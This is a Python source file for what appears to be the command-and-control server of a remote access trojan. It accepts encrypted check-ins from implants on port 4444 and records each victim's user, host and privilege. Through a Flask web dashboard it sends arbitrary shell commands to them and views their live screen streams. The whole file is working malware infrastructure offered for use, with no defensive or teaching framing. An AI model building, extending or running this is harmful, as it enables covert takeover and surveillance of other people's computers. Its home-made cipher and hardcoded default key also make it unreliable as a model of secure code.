#!/usr/bin/env python3
import socket
import threading
import json
import struct
import time
import hashlib
import hmac
import os
import queue
from flask import Flask, send_from_directory, request, jsonify

PORT = 4444
WEB = 5000
KEY = os.environ.get("CROCK_KEY", "CrockKey2026!!CrockKey2026!!!!!").encode()
AUTH_TOKEN = os.environ.get("CROCK_TOKEN", "crock-local-token")
MAX_MSG = 8 * 1024 * 1024
CMD_TIMEOUT = 60

app = Flask(__name__)
clients = {}
clients_lock = threading.Lock()
next_id = [1]
next_id_lock = threading.Lock()

BASE = os.path.dirname(os.path.abspath(__file__))


def check_auth():
    token = request.headers.get("X-Auth") or request.args.get("token")
    return token == AUTH_TOKEN


def keystream(counter, length):
    out = b""
    c = counter
    while len(out) < length:
        out += hashlib.sha256(KEY + struct.pack("<I", c)).digest()
        c += 1
    return out[:length]


def mac(data):
    return hmac.new(KEY, data, hashlib.sha256).digest()[:16]


def recvall(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


class Client:
    def __init__(self, conn, addr, cid):
        self.conn = conn
        self.addr = addr
        self.cid = cid
        self.info = {}
        self.alive = True
        self.send_lock = threading.Lock()
        self.send_ctr = 0x1337
        self.recv_ctr = 0x1337
        self.latest_frame = None
        self.streaming = False
        self.pending = None
        self.reader_thread = None

    def start(self):
        self.reader_thread = threading.Thread(target=self._read_loop, daemon=True)
        self.reader_thread.start()

    def _send_msg(self, data):
        if isinstance(data, str):
            data = data.encode()
        body = mac(data) + data
        ks = keystream(self.send_ctr, len(body))
        enc = bytes(a ^ b for a, b in zip(body, ks))
        self.send_ctr += (len(body) + 31) // 32
        self.conn.sendall(struct.pack(">I", len(enc)) + enc)

    def _recv_msg(self):
        raw = recvall(self.conn, 4)
        if not raw:
            return None
        length = struct.unpack(">I", raw)[0]
        if length == 0 or length > MAX_MSG:
            return None
        buf = recvall(self.conn, length)
        if not buf or len(buf) != length:
            return None
        ks = keystream(self.recv_ctr, len(buf))
        plain = bytes(a ^ b for a, b in zip(buf, ks))
        self.recv_ctr += (len(buf) + 31) // 32
        if len(plain) < 16:
            return None
        tag, msg = plain[:16], plain[16:]
        if not hmac.compare_digest(tag, mac(msg)):
            return None
        return msg.decode(errors="ignore")

    def _read_loop(self):
        try:
            while self.alive:
                msg = self._recv_msg()
                if msg is None:
                    break
                if msg.startswith("FRAME:"):
                    self.latest_frame = msg[6:]
                else:
                    p = self.pending
                    if p is not None:
                        try:
                            p.put_nowait(msg)
                        except queue.Full:
                            pass
        except Exception:
            pass
        finally:
            self.alive = False
            try:
                self.conn.close()
            except Exception:
                pass
            p = self.pending
            if p is not None:
                try:
                    p.put_nowait("__disconnected__")
                except queue.Full:
                    pass

    def send_cmd(self, cmd, timeout=CMD_TIMEOUT):
        if not self.alive:
            return "offline"
        with self.send_lock:
            if not self.alive:
                return "offline"
            self.pending = queue.Queue()
            try:
                self._send_msg(cmd)
                try:
                    resp = self.pending.get(timeout=timeout)
                except queue.Empty:
                    # avoid desync — kill the connection
                    self.alive = False
                    try:
                        self.conn.close()
                    except Exception:
                        pass
                    return "timeout"
            except Exception as e:
                self.alive = False
                try:
                    self.conn.close()
                except Exception:
                    pass
                return "error: " + str(e)
            finally:
                self.pending = None
            if resp == "__disconnected__":
                return "offline"
            return resp


def client_handler(conn, addr):
    try:
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        conn.settimeout(15)
        raw = recvall(conn, 4)
        if not raw:
            conn.close()
            return
        length = struct.unpack(">I", raw)[0]
        if length == 0 or length > MAX_MSG:
            conn.close()
            return
        payload = recvall(conn, length)
        if not payload or len(payload) != length:
            conn.close()
            return

        recv_ctr = 0x1337
        ks = keystream(recv_ctr, len(payload))
        plain = bytes(a ^ b for a, b in zip(payload, ks))
        recv_ctr += (len(payload) + 31) // 32
        if len(plain) < 16:
            conn.close()
            return
        tag, msg = plain[:16], plain[16:]
        if not hmac.compare_digest(tag, mac(msg)):
            conn.close()
            return
        try:
            info = json.loads(msg.decode(errors="ignore"))
        except Exception:
            info = {"u": "?", "h": "?", "a": 0}

        with next_id_lock:
            cid = next_id[0]
            next_id[0] += 1

        client = Client(conn, addr, cid)
        client.info = info
        client.recv_ctr = recv_ctr

        conn.settimeout(None)  # blocking reads in the reader thread

        with clients_lock:
            clients[cid] = client

        client.start()
        print(f"[+] Client {cid} ({info.get('u')}@{info.get('h')}) from {addr[0]}")

        while client.alive:
            time.sleep(1)

        with clients_lock:
            clients.pop(cid, None)
        print(f"[-] Client {cid} offline")
    except Exception:
        try:
            conn.close()
        except Exception:
            pass


def start_listener():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(20)
    print(f"[*] Listening on {PORT}")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()


@app.route("/")
def index():
    return send_from_directory(BASE, "dashboard.html")


@app.route("/clients")
def list_clients():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    result = []
    with clients_lock:
        for cid, c in clients.items():
            if c.alive:
                i = c.info
                result.append({
                    "id": cid,
                    "u": i.get("u", "?"),
                    "h": i.get("h", "?"),
                    "ip": c.addr[0],
                    "a": i.get("a", 0),
                })
    return jsonify(result)


@app.route("/frame")
def get_frame():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    cid = request.args.get("id", type=int)
    if cid is None:
        return jsonify({"frame": None})
    with clients_lock:
        c = clients.get(cid)
        if not c or not c.alive:
            return jsonify({"frame": None})
        frame = c.latest_frame
    return jsonify({"frame": frame})


@app.route("/cmd", methods=["POST"])
def command():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    data = request.json or {}
    cid = data.get("id")
    cmd = data.get("cmd", "")
    if cid is None or not cmd:
        return jsonify({"out": "bad request"}), 400
    with clients_lock:
        c = clients.get(cid)
    if not c or not c.alive:
        return jsonify({"out": "offline"})

    if cmd == "stream_start":
        resp = c.send_cmd("stream_start")
        if resp == "stream started":
            c.streaming = True
        return jsonify({"out": resp})

    if cmd == "stream_stop":
        c.streaming = False
        resp = c.send_cmd("stream_stop")
        return jsonify({"out": resp})

    resp = c.send_cmd(cmd)
    return jsonify({"out": resp})


if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    print(f"[*] Web UI on http://127.0.0.1:{WEB}")
    app.run(host="127.0.0.1", port=WEB, threaded=True)
